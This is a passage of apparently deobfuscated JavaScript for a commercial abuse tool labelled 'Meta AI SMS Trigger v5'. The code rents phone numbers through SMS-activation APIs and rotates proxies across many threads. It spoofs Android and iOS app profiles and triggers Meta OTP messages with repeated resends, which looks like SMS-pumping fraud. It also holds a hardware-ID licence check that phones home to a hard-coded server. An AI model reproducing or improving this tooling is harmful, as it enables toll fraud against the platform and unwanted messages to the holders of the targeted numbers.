                              v669 && v669.length > 0 && (v660 = v669, v663 = 3);
                            } else {
                              {
                                v660 = [];
                                let v670 = true;
                                while (v670) {
                                  const v671 = await promptText("Enter range #" + (v660.length + 1) + " (e.g. 26134XXX) or 'back':", '');
                                  if (v671.toLowerCase() === "back") {
                                    if (v660.length === 0) break;else {
                                      v660.pop();
                                      continue;
                                    }
                                  }
                                  if (v671) v660.push(v671);
                                  const v672 = {};
                                  v672.name = "Yes", v672.value = "yes";
                                  const v673 = {};
                                  v673.name = 'No', v673.value = 'no';
                                  const v674 = await selectOption("Added " + v660.length + ". Add another?", [v672, v673]);
                                  if (v674 === 'no') v670 = false;
                                }
                                if (v660.length > 0) v663 = 3;
                              }
                            }
                          }
                        } else {
                          if (v663 === 3) {
                            const v675 = await promptText("How many numbers? [default:50]:", '50');
                            if (v675.toLowerCase() === "back") {
                              v663 = 2;
                              continue;
                            }
                            v661 = parseInt(v675) || 50;
                            const v676 = {};
                            v676.provider = v636, v676.apiKey = v659, v676.getPath = v657, v676.consolePath = v658, v676.ranges = v660, v676.totalCount = v661, v639 = v676, v638 = null, v663 = 4;
                          }
                        }
                      }
                    }
                    if (v662) {
                      v635 = 1;
                      continue;
                    }
                    v635 = 3;
                  }
                } else {
                  if (v636 === "smsbower") {
                    {
                      let v677 = '',
                        v678 = 'fb',
                        v679 = '0',
                        v680 = "0.5",
                        v681 = 50,
                        v682 = 1,
                        v683 = false;
                      while (v682 <= 4 && !v683) {
                        process.stdout.write("[2J[H"), printHeader();
                        if (v682 === 1) {
                          {
                            if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                              {
                                v677 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                                const v684 = await selectOption("SMS Bower key found (" + v677.substring(0, 10) + "...)", [{
                                  'name': "Use saved key",
                                  'value': "use"
                                }, {
                                  'name': "Enter new key",
                                  'value': "new"
                                }, {
                                  'name': "Remove saved key",
                                  'value': "remove"
                                }, {
                                  'name': "⬅️ Back",
                                  'value': "back"
                                }]);
                                if (v684 === "back") {
                                  v683 = true;
                                  break;
                                }
                                if (v684 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v677 = '';else {
                                  if (v684 === "new") v677 = '';
                                }
                              }
                            }
                            if (!v677) {
                              v677 = await promptText("Enter SMS Bower API Key:", '');
                              if (v677.toLowerCase() === "back") {
                                v683 = true;
                                break;
                              }
                              const v685 = {};
                              v685.name = 'No', v685.value = 'no';
                              const v686 = await selectOption("Save key?", [{
                                'name': "Yes",
                                'value': "yes"
                              }, v685]);
                              if (v686 === "yes" && v677) fs.writeFileSync(SMSBOWER_KEY_FILE, v677, "utf8");
                            }
                            if (v677) v682 = 2;
                          }
                        } else {
                          if (v682 === 2) {
                            {
                              v678 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                              if (v678.toLowerCase() === "back") {
                                v682 = 1;
                                continue;
                              }
                              v678 = v678 || 'fb', v682 = 3;
                            }
                          } else {
                            if (v682 === 3) {
                              v679 = await promptText("Country code (0 = any) [default: 0]:", '0');
                              if (v679.toLowerCase() === "back") {
                                {
                                  v682 = 2;
                                  continue;
                                }
                              }
                              v679 = v679 || '0';
                              const v687 = await promptText("Max price per number [default: 0.5]:", "0.5");
                              v680 = v687 || "0.5", v682 = 4;
                            } else {
                              if (v682 === 4) {
                                {
                                  const v688 = await promptText("How many numbers? [default: 50]:", '50');
                                  if (v688.toLowerCase() === "back") {
                                    v682 = 3;
                                    continue;
                                  }
                                  v681 = parseInt(v688) || 50;
                                  const v689 = {};
                                  v689.apiKey = v677, v689.service = v678, v689.country = v679, v689.maxPrice = v680, v689.totalCount = v681, v640 = v689, v638 = null, v639 = null, v641 = null, v682 = 5;
                                }
                              }
                            }
                          }
                        }
                      }
                      if (v683) {
                        {
                          v635 = 1;
                          continue;
                        }
                      }
                      v635 = 3;
                    }
                  } else {
                    if (v636 === "zenex") {
                      let v690 = '',
                        v691 = [],
                        v692 = 50,
                        v693 = 1,
                        v694 = false;
                      while (v693 <= 3 && !v694) {
                        {
                          process.stdout.write("[2J[H"), printHeader();
                          if (v693 === 1) {
                            {
                              if (fs.existsSync(ZENEX_KEY_FILE)) {
                                {
                                  v690 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                                  const v695 = await selectOption("Zenex key found (" + v690.substring(0, 10) + "...)", [{
                                    'name': "Use saved key",
                                    'value': "use"
                                  }, {
                                    'name': "Enter new key",
                                    'value': "new"
                                  }, {
                                    'name': "Remove saved key",
                                    'value': "remove"
                                  }, {
                                    'name': "⬅️ Back",
                                    'value': "back"
                                  }]);
                                  if (v695 === "back") {
                                    {
                                      v694 = true;
                                      break;
                                    }
                                  }
                                  if (v695 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v690 = '';else {
                                    if (v695 === "new") v690 = '';
                                  }
                                }
                              }
                              if (!v690) {
                                {
                                  v690 = await promptText("Enter Zenex API Key (mapikey):", '');
                                  if (v690.toLowerCase() === "back") {
                                    v694 = true;
                                    break;
                                  }
                                  const v696 = {};
                                  v696.name = 'No', v696.value = 'no';
                                  const v697 = await selectOption("Save key?", [{
                                    'name': "Yes",
                                    'value': "yes"
                                  }, v696]);
                                  if (v697 === "yes" && v690) fs.writeFileSync(ZENEX_KEY_FILE, v690, "utf8");
                                }
                              }
                              if (v690) v693 = 2;
                            }
                          } else {
                            if (v693 === 2) {
                              v691 = [];
                              let v698 = true;
                              while (v698) {
                                {
                                  const v699 = await promptText("Enter range #" + (v691.length + 1) + " (e.g. 4473845XXX) or 'back':", '');
                                  if (v699.toLowerCase() === "back") {
                                    if (v691.length === 0) {
                                      {
                                        v694 = true;
                                        break;
                                      }
                                    } else {
                                      v691.pop();
                                      continue;
                                    }
                                  }
                                  if (v699) v691.push(v699);
                                  const v700 = {};
                                  v700.name = "Yes", v700.value = "yes";
                                  const v701 = {};
                                  v701.name = 'No', v701.value = 'no';
                                  const v702 = await selectOption("Added " + v691.length + ". Add another?", [v700, v701]);
                                  if (v702 === 'no') v698 = false;
                                }
                              }
                              if (v691.length > 0) v693 = 3;
                            } else {
                              if (v693 === 3) {
                                {
                                  const v703 = await promptText("How many numbers? [default: 50]:", '50');
                                  if (v703.toLowerCase() === "back") {
                                    v693 = 2;
                                    continue;
                                  }
                                  v692 = parseInt(v703) || 50;
                                  const v704 = {};
                                  v704.apiKey = v690, v704.ranges = v691, v704.totalCount = v692, v641 = v704, v638 = null, v639 = null, v640 = null, v693 = 4;
                                }
                              }
                            }
                          }
                        }
                      }
                      if (v694) {
                        v635 = 1;
                        continue;
                      }
                      v635 = 3;
                    } else {
                      let v705 = 1,
                        v706 = false;
                      while (v705 <= 4 && !v706) {
                        process.stdout.write("[2J[H"), printHeader();
                        if (v705 === 1) {
                          if (fs.existsSync(v651)) {
                            {
                              const v707 = fs.readFileSync(v651, "utf8").trim(),
                                v708 = await selectOption("Found saved API Key (..." + v707.slice(-4) + "). Use it?", [{
                                  'name': "Yes, use saved key",
                                  'value': "yes"
                                }, {
                                  'name': "No, enter new key",
                                  'value': 'no'
                                }, {
                                  'name': "Delete saved key",
                                  'value': "delete"
                                }, {
                                  'name': "⬅️ Go Back to Number Source",
                                  'value': "back"
                                }]);
                              if (v708 === "back") {
                                v706 = true;
                                break;
                              }
                              if (v708 === "yes") v647 = v707;else {
                                if (v708 === "delete") {
                                  if (fs.existsSync(v651)) fs.unlinkSync(v651);
                                  v647 = '';
                                }
                              }
                            }
                          }
                          if (!v647) {
                            {
                              const v709 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                              if (v709.toLowerCase() === "back") {
                                {
                                  v706 = true;
                                  break;
                                }
                              }
                              v647 = v709;
                              const v710 = {};
                              v710.name = 'No', v710.value = 'no';
                              const v711 = await selectOption("Save this key for future use?", [{
                                'name': "Yes, save it",
                                'value': "yes"
                              }, v710]);
                              v711 === "yes" && v647 && fs.writeFileSync(v651, v647, "utf8");
                            }
                          }
                          if (v647) v705 = 2;
                        } else {
                          if (v705 === 2) {
                            v648 = [];
                            let v712 = true;
                            while (v712) {
                              const v713 = await promptText("Enter range #" + (v648.length + 1) + " (e.g. 21624485XXX) or type 'back':", '');
                              if (v713.toLowerCase() === "back") {
                                if (v648.length === 0) {
                                  {
                                    v705 = 1;
                                    break;
                                  }
                                } else {
                                  {
                                    v648.pop();
                                    continue;
                                  }
                                }
                              }
                              if (v713) v648.push(v713);
                              const v714 = await selectOption("Added " + v648.length + " range(s). Add another?", [{
                                'name': "Yes, add another range",
                                'value': "yes"
                              }, {
                                'name': "No, proceed to next step",
                                'value': 'no'
                              }, {
                                'name': "⬅️ Go Back to API Key",
                                'value': "back"
                              }]);
                              if (v714 === "back") {
                                v705 = 1;
                                break;
                              }
                              if (v714 === 'no') v712 = false;
                            }
                            if (v648.length > 0) v705 = 3;
                          } else {
                            if (v705 === 3) {
                              const v715 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                              if (v715.toLowerCase() === "back") {
                                {
                                  v705 = 2;
                                  continue;
                                }
                              }
                              v649 = parseInt(v715) || 50, v705 = 4;
                            } else {
                              if (v705 === 4) {
                                const v716 = await selectOption("SELECT NEXA SERVER", [{
                                  'name': "Server 1 (/get)",
                                  'value': "/api/v1/numbers/get"
                                }, {
                                  'name': "Server 2 (/p2/get)",
                                  'value': "/api/v1/numbers/p2/get"
                                }, {
                                  'name': "Server 3 (/p3/get)",
                                  'value': "/api/v1/numbers/p3/get"
                                }, {
                                  'name': "⬅️ Go Back to Count Input",
                                  'value': "back"
                                }]);
                                if (v716 === "back") {
                                  {
                                    v705 = 3;
                                    continue;
                                  }
                                }
                                v650 = v716;
                                const v717 = {};
                                v717.apiKey = v647, v717.ranges = v648, v717.totalCount = v649, v717.serverEndpoint = v650, v638 = v717, v705 = 5;
                              }
                            }
                          }
                        }
                      }
                      if (v706) {
                        v635 = 1;
                        continue;
                      }
                      v635 = 3;
                    }
                  }
                }
              }
            }
          } else {
            if (v635 === 3) {
              {
                const v718 = await selectOption("SELECT PROXIES FILE", [{
                  'name': "✏️ Custom File Path",
                  'value': "custom"
                }, {
                  'name': "🚫 None (Direct Connection)",
                  'value': "none"
                }, {
                  'name': "⬅️ Go Back to Numbers Selection",
                  'value': "back"
                }]);
                if (v718 === "back") {
                  {
                    v635 = 2;
                    continue;
                  }
                }
                if (v718 === "custom") {
                  {
                    const v719 = await promptText("Enter Proxies File Path:", "proxies.txt");
                    if (v719.toLowerCase() === "back") continue;
                    v642 = v719;
                  }
                } else {
                  if (v718 === "none") {
                    v642 = '';
                  } else v642 = v718;
                }
                v635 = 4;
              }
            } else {
              if (v635 === 4) {
                {
                  const v720 = await selectOption("SELECT THREADS", [{
                    'name': "10 Threads",
                    'value': 0xa
                  }, {
                    'name': "20 Threads (Default)",
                    'value': 0x14
                  }, {
                    'name': "50 Threads (Fast)",
                    'value': 0x32
                  }, {
                    'name': "100 Threads (Extreme)",
                    'value': 0x64
                  }, {
                    'name': "⌨️  Custom...",
                    'value': -1
                  }, {
                    'name': "⬅️ Go Back to Proxies Selection",
                    'value': "back"
                  }]);
                  if (v720 === "back") {
                    {
                      v635 = 3;
                      continue;
                    }
                  }
                  if (v720 === -1) {
                    {
                      const v721 = await promptText("Enter custom thread count (type 'back' to go back):", '20');
                      if (v721.toLowerCase() === "back") continue;
                      v643 = parseInt(v721) || 20;
                    }
                  } else v643 = v720;
                  v635 = 5;
                }
              } else {
                if (v635 === 5) {
                  const v722 = await selectOption("SELECT REGION", [{
                    'name': "🎲 Random",
                    'value': "random"
                  }, {
                    'name': "🇺🇸 English (en-US)",
                    'value': "en-US"
                  }, {
                    'name': "🇪🇸 Spanish (es-ES)",
                    'value': "es-ES"
                  }, {
                    'name': "⬅️ Go Back to Threads Selection",
                    'value': "back"
                  }]);
                  if (v722 === "back") {
                    {
                      v635 = 4;
                      continue;
                    }
                  }
                  v644 = v722, v635 = 6;
                } else {
                  if (v635 === 6) {
                    const v723 = await selectOption("SELECT DEVICE PROFILE", [{
                      'name': "🎲 Random (Android + iOS)",
                      'value': "random"
                    }, {
                      'name': "📱 Android App (Stella)",
                      'value': "android"
                    }, {
                      'name': "🍎 iOS App (Stella)",
                      'value': "ios"
                    }, {
                      'name': "⬅️ Go Back to Region Selection",
                      'value': "back"
                    }]);
                    if (v723 === "back") {
                      {
                        v635 = 5;
                        continue;
                      }
                    }
                    v645 = v723, v635 = 7;
                  } else {
                    if (v635 === 7) {
                      {
                        const v724 = await promptText("Enter number of OTP resends per number (type 'back' to go back) [default: 0]:", '0');
                        if (v724.toLowerCase() === "back") {
                          v635 = 6;
                          continue;
                        }
                        v646 = parseInt(v724) || 0, v635 = 8;
                      }
                    } else {
                      if (v635 === 8) {
                        break;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v637,
      'threads': String(v643),
      'proxiesFile': v642,
      'region': v644,
      'browser': v645,
      'resends': String(v646),
      'nexaConfig': v638,
      'twoOoConfig': v639,
      'smsBowerConfig': v640,
      'zenexConfig': v641
    };
  }
  function generateHWID() {
    const v725 = require('os');
    const v726 = v725.platform();
    try {
      if (v726 === "win32") {
        const v727 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': "pipe",
          'timeout': 0x3a98
        }).toString().trim();
        if (!v727) throw new Error("No hardware data");
        const v728 = crypto.createHash("sha256").update(v727).digest("hex").toUpperCase();
        return "SKING-" + v728.substring(0, 8) + '-' + v728.substring(8, 12) + '-' + v728.substring(12, 16);
      } else {
        {
          let v729 = [];
          try {
            const v732 = {};
            v732.stdio = "pipe", v732.timeout = 0x1388;
            const v733 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v732).toString().trim();
            if (v733 && v733 !== "null") v729.push('A:' + v733);
          } catch (v734) {}
          try {
            if (fs.existsSync("/proc/cpuinfo")) {
              {
                const v735 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v736 = v735.match(/Serial\s*:\s*(\S+)/i),
                  v737 = v735.match(/Hardware\s*:\s*(.+)/i);
                if (v736 && v736[1] !== "0000000000000000") v729.push('S:' + v736[1].trim());
                if (v737) v729.push('H:' + v737[1].trim());
              }
            }
          } catch (v738) {}
          try {
            if (fs.existsSync("/etc/machine-id")) {
              const v739 = fs.readFileSync("/etc/machine-id", "utf8").trim();
              if (v739) v729.push('M:' + v739);
            }
          } catch (v740) {}
          try {
            {
              const v741 = v725.cpus(),
                v742 = v741 && v741.length > 0 ? v741[0].model : "UnknownCPU",
                v743 = v725.totalmem(),
                v744 = v725.release(),
                v745 = v725.hostname();
              v729.push('F:' + v742 + '|' + v743 + '|' + v744 + '|' + v745);
            }
          } catch (v746) {}
          const v730 = v729.join('||'),
            v731 = crypto.createHash("sha256").update(v730).digest("hex").toUpperCase();
          return "ANKING-" + v731.substring(0, 8) + '-' + v731.substring(8, 12) + '-' + v731.substring(12, 16);
        }
      }
    } catch (v747) {
      return '';
    }
  }
  function verifyServerSignature(v748, v749) {
    if (!v749) return false;
    const v750 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v748, "utf8"), v750, Buffer.from(v749, "base64"));
    } catch (v751) {
      return false;
    }
  }
  async function start() {
    const v752 = generateHWID();
    if (!v752) {
      console.error(R("\n  ✗ Could not generate Hardware ID.")), console.error(R("  ✗ Please run on Windows or provide HWID as argument.\n")), process.exit(1);
    }
    const v753 = generateHWID();
    v753 !== v752 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + C("Meta AI SMS Trigger v5        ") + W('│')), console.log(W("│ [•] Your HWID : ") + Y(v752.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v754 = false,
      v755 = "Licensed";
    const v756 = Date.now();
    try {
      {
        const v770 = "188.137.176.163",
          v771 = await new Promise((v772, v773) => {
            const v774 = {};
            v774.hwid = v752, v774.app_id = "Meta Apk", v774.version = "2.0.2";
            v774.timestamp = v756;
            const v775 = JSON.stringify(v774),
              v776 = {
                'hostname': v770,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v775)
                },
                'timeout': 0x2710
              },
              v777 = http.request(v776, v778 => {
                let v779 = '';
                v778.on("data", v780 => v779 += v780);
                v778.on("end", () => {
                  try {
                    v772(JSON.parse(v779));
                  } catch (v781) {
                    v773(v781);
                  }
                });
              });
            v777.on("error", v773);
            v777.on("timeout", function () {
              this.destroy(), v773(new Error("Timeout"));
            }), v777.write(v775), v777.end();
          });
        if (v771) {
          {
            v771.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
            if (v771.status === "banned" || v771.status === "expired" || !v771.sig) {
              await new Promise(v786 => setTimeout(v786, 2000));
              let v785 = String(v771.reason || "NOT REGISTERED");
              if (!v771.reason && !v771.sig) v785 = "NOT REGISTERED / REMOVED";
              console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — META TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v752.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v785.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/scraper_king to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
            }
            const v782 = "Meta Apk",
              v783 = v752 + '|' + v782 + "|2.0.2|" + v756;
            !verifyServerSignature(v783, v771.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
            v754 = true;
            let v784 = v771.token;
            !v784 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
              !v784 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
              const v787 = {};
              v787.hwid = v752, v787.app_id = v782;
              v787.token = v784;
              const v788 = JSON.stringify(v787),
                v789 = {
                  'hostname': v770,
                  'port': 0xec1,
                  'path': "/api/ping",
                  'method': "POST",
                  'headers': {
                    'Content-Type': "application/json",
                    'Content-Length': Buffer.byteLength(v788)
                  },
                  'timeout': 0x1388
                },
                v790 = http.request(v789, v791 => {
                  {
                    let v792 = '';
                    v791.on("data", v793 => v792 += v793), v791.on("end", () => {
                      try {
                        const v794 = JSON.parse(v792);
                        if (v794.status === 'ok' && v794.token) {
                          v784 = v794.token;
                        } else console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1);
                      } catch (v795) {
                        console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                      }
                    });
                  }
                });
              v790.on("error", () => {
                console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
                process.exit(1);
              });
              v790.on("timeout", function () {
                this.destroy();
                console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
                process.exit(1);
              });
              v790.write(v788);
              v790.end();
            }, 45000);
          }
        }
      }
    } catch (v796) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v754 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    const v757 = process.argv.slice(2).filter(v797 => !v797.startsWith('--'));
    let v758 = v757,
      v759 = null,
      v760 = null,
      v761 = null,
      v762 = null;
    if (v758.length === 0) {
      {
        const v798 = await interactiveWizard();
        v758 = [v798.numbersFile, v798.threads, v798.proxiesFile, v798.region, v798.browser, "SKING-UI-HARDWARE-ID", v798.resends], v759 = v798.nexaConfig, v760 = v798.twoOoConfig || null, v761 = v798.smsBowerConfig || null, v762 = v798.zenexConfig || null;
      }
    }
    v758 = v758.map(v799 => {
      if (typeof v799 === "string") {
        if (v799.startsWith('\x22') && v799.endsWith('\x22')) return v799.slice(1, -1);
        if (v799.startsWith('\x27') && v799.endsWith('\x27')) return v799.slice(1, -1);
      }
      return v799;
    });
    let v763 = path.resolve(v758[0] || "numbers.txt");
    let v764 = parseInt(v758[1]) || 20,
      v765 = v758[2] !== undefined ? v758[2] : "proxies.txt";
    if (v765.toLowerCase() === "none" || v765 === "false") v765 = '';
    let v766 = v758[3] || "random",
      v767 = v758[4] || "random";
    let v768 = parseInt(v758[6]) || 0;
    v765 && !v765.includes(':') && !path.isAbsolute(v765) && (v765 = path.resolve(v765));
    printHeader();
    console.log(B("  ✓ License: " + v755) + G(" | HWID: " + v752));
    let v769 = true;
    while (v769) {
      {
        let v800 = [];
        !v759 && !v760 && !v761 && !v762 && (!fs.existsSync(v763) && (console.error(R("✗ Error: Numbers file not found: " + v763)), process.exit(1)), v800 = fs.readFileSync(v763, "utf8").split(/\r?\n/).map(v823 => v823.trim()).filter(v824 => v824 && v824.replace(/\D/g, '').length >= 7), v800.length === 0 && (console.error(R("✗ No valid phone numbers found in file")), process.exit(1)));
        let v801 = [];
        if (v765 && fs.existsSync(v765)) {
          v801 = fs.readFileSync(v765, "utf8").split('\x0a').map(v825 => v825.trim()).filter(v826 => v826.length > 0 && !v826.startsWith('#'));
        }
        let v802 = [];
        for (const v827 of v801) {
          {
            const v828 = parseProxy(v827);
            if (!v828) {
              {
                {
                  console.error(R("\n  ✗ Invalid proxy format detected: \"" + v827 + '\x22'));
                  console.error(R("  Please use one of the supported formats:"));
                  console.error(R("    - host:port"));
                  console.error(R("    - user:pass@host:port"));
                  console.error(R("    - host:port:user:pass"));
                  console.error(R("    - user:pass:host:port\n"));
                  process.exit(1);
                }
              }
            }
            v802.push(v828);
          }
        }
        const v803 = v759 || v760 || v761 || v762;
        if (v803) {
          const v829 = v759 ? "NexaOTP" : v760 ? v760.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v761 ? "📱 SMS Bower" : "⚡ Zenex";
          console.log(C("✓ Target  : " + v829 + " API (" + v803.totalCount + " numbers)"));
        } else {
          console.log(Y("✓ Loaded " + v800.length + " targets"));
        }
        if (v802.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v802.length));
        console.log(C("✓ Threads: " + v764 + '\x0a'));
        const v804 = "successful.txt",
          v805 = "failed.txt";
        fs.writeFileSync(v804, ''), fs.writeFileSync(v805, '');
        const v806 = new Dashboard(v803 ? v803.totalCount : v800.length);
        let v807 = [],
          v808 = [],
          v809 = 0,
          v810 = false;
        if (v759 || v760) {
          const v830 = v759 ? "NexaOTP" : v760.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
          (async () => {
            {
              let v831 = 0,
                v832 = '';
              try {
                for (let v833 = 0; v833 < v803.totalCount; v833++) {
                  try {
                    {
                      const v834 = v803.ranges[Math.floor(Math.random() * v803.ranges.length)];
                      let v835;
                      if (v759) v835 = await nexaLimiter.enqueue(() => nexaFetchNumber(v759.apiKey, v834, v759.serverEndpoint));else {
                        v835 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v760.apiKey, v834, v760.getPath));
                      }
                      v835 && (v809++, v831 = 0, v808.length > 0 ? v808.shift()(v835) : v807.push(v835));
                    }
                  } catch (v836) {
                    {
                      v832 = v836.message, v831++;
                      if (v836.message.includes("Insufficient balance")) {
                        {
                          console.error(R("\n  [" + v830 + "] ✗ Insufficient balance — aborting.\n"));
                          break;
                        }
                      }
                      if (v836.message.includes("No numbers available")) {
                        continue;
                      }
                      if (v831 >= 5 && v809 === 0) {
                        {
                          console.error(R("\n  [" + v830 + "] ✗ Aborting — 5 consecutive fetch failures.")), console.error(R("  Last error: " + v832)), console.error(R("  Check your API key, range format (e.g. 26134XXX), and internet connection.\n"));
                          break;
                        }
                      }
                    }
                  }
                }
              } finally {
                if (v809 === 0) {
                  console.error(R("\n  [" + v830 + "] ✗ No numbers were fetched. Last error: " + (v832 || "Unknown") + '\x0a'));
                } else {
                  console.log(G("\n  [" + v830 + "] ✓ Feeder done — " + v809 + " numbers fetched.\n"));
                }
                v810 = true;
                while (v808.length > 0) v808.shift()(null);
              }
            }
          })();
        } else {
          if (v761) {
            const v837 = v761;
            (async () => {
              {
                let v838 = 0;
                try {
                  for (let v839 = 0; v839 < v837.totalCount; v839++) {
                    try {
                      {
                        const {
                          activationId: v840,
                          phoneNumber: v841
                        } = await smsBowerFetchNumber(v837.apiKey, v837.service, v837.country, v837.maxPrice);
                        v809++, v838 = 0;
                        if (v808.length > 0) v808.shift()(v841);else v807.push(v841);
                      }
                    } catch (v842) {
                      v838++;
                      if (v838 >= 5 && v809 === 0) break;
                      await new Promise(v843 => setTimeout(v843, 2000));
                    }
                  }
                } finally {
                  v810 = true;
                  while (v808.length > 0) v808.shift()(null);
                }
              }
            })();
          } else {
            if (v762) {
              const v844 = v762;
              (async () => {
                {
                  let v845 = 0;
                  try {
                    for (let v846 = 0; v846 < v844.totalCount; v846++) {
                      try {
                        {
                          const v847 = v844.ranges[Math.floor(Math.random() * v844.ranges.length)],
                            v848 = await zenexFetchNumber(v844.apiKey, v847);
                          v809++, v845 = 0;
                          if (v808.length > 0) v808.shift()(v848);else v807.push(v848);
                        }
                      } catch (v849) {
                        {
                          v845++;
                          if (v845 >= 5 && v809 === 0) break;
                          await new Promise(v850 => setTimeout(v850, 2000));
                        }
                      }
                    }
                  } finally {
                    v810 = true;
                    while (v808.length > 0) v808.shift()(null);
                  }
                }
              })();
            }
          }
        }
        const v811 = !!(v759 || v760 || v761 || v762),
          v812 = v811 ? () => {
            if (v807.length > 0) return Promise.resolve(v807.shift());
            if (v810) return Promise.resolve(null);
            return new Promise(v851 => v808.push(v851));
          } : (() => {
            let v852 = null;
            const fn10 = () => {
              if (v852) clearTimeout(v852);
              v852 = setTimeout(() => {
                try {
                  fs.writeFileSync(v763, v800.join('\x0a'), "utf8");
                } catch (v853) {}
              }, 50);
            };
            return () => {
              if (v800.length === 0) return Promise.resolve(null);
              const v854 = Math.floor(Math.random() * v800.length);
              const v855 = v800.splice(v854, 1)[0];
              return fn10(), Promise.resolve(v855);
            };
          })();
        let v813 = 0;
        const fn8 = () => {
            if (v802.length === 0) return null;
            const v856 = v802[v813 % v802.length];
            v813++;
            return rotateSessionId(v856);
          },
          v814 = new Set(),
          v815 = {};
        v815.flags = 'a';
        const v816 = fs.createWriteStream(v804, v815),
          v817 = {};
        v817.flags = 'a';
        const v818 = fs.createWriteStream(v805, v817),
          v819 = v811 ? Math.min(v764, v803.totalCount) : Math.min(v764, v800.length),
          v820 = [],
          v821 = setInterval(() => v806.render(), 500);
        async function fn9(v857) {
          while (true) {
            const v858 = await v812();
            if (!v858) break;
            const v859 = fn8(),
              v860 = normalizePhoneNumber(v858).replace('+', ''),
              v861 = getCountryFromPhone(v860),
              v862 = v861.iso,
              v863 = v766 && v766 !== "random" ? v766 : v861.lang.split(',')[0];
            let v864 = v862;
            try {
              v864 = _displayNames.of(v862) || v862;
            } catch (v868) {}
            const v865 = v859 ? getProxyCountry(v859) : "Direct",
              v866 = '[' + v863 + "] Proxy: " + v865 + " | " + v864;
            try {
              {
                const v869 = await triggerSms(v858, {
                  'onStatus': v870 => v806.setStatus("Worker " + v857 + ':\x20' + v870),
                  'onLog': (v871, v872) => v806.addLog(v871, v872, v866),
                  'proxy': v859,
                  'workerId': v857,
                  'browserPref': v767,
                  'regionPref': v766,
                  'resends': v768,
                  'timeout': 0x9c40
                });
                if (v869.success) {
                  {
                    v806.successful++, v806.processed++, v814.add(v858.trim());
                    const v873 = v859 ? v859.host + ':' + v859.port : "direct",
                      v874 = new Date().toISOString().replace('T', '\x20').substring(0, 19);
                    v816.write('' + v869.phone + ("|lang:" + (v869.lang || v863)) + ("|proxy:" + v873) + ("|country:" + v864) + ("|ts:" + v874 + '\x0a')), v806.addLog("SMS Sent to " + v869.phone, "success", v866);
                  }
                } else {
                  v806.failed++, v806.processed++, v818.write((v869.phone || v858) + '|' + v869.message + '\x0a'), !v869.message.includes("429") && v806.addLog("Failed on " + (v869.phone || v858) + ':\x20' + v869.message, "error", v866);
                }
              }
            } catch (v875) {
              v806.failed++, v806.processed++, v818.write(v858 + '|' + v875.message + '\x0a'), !v875.message.includes("429") && v806.addLog("Fatal error on " + v858 + ':\x20' + v875.message, "error", v866);
            }
            const v867 = Math.floor(Math.random() * 3000) + 1500;
            await delay(v867, v867 + 500);
          }
        }
        for (let v876 = 0; v876 < v819; v876++) {
          v820.push(fn9(v876));
        }
        await Promise.all(v820), clearInterval(v821), await new Promise(v877 => v816.end(v877)), await new Promise(v878 => v818.end(v878)), v806.render(), v806.stop();
        const v822 = await selectOption("Processing Complete. What next?", [{
          'name': "Reuse successful numbers (" + v804 + ')',
          'value': "reuse"
        }, {
          'name': "Go Home (Restart)",
          'value': "home"
        }, {
          'name': "Exit",
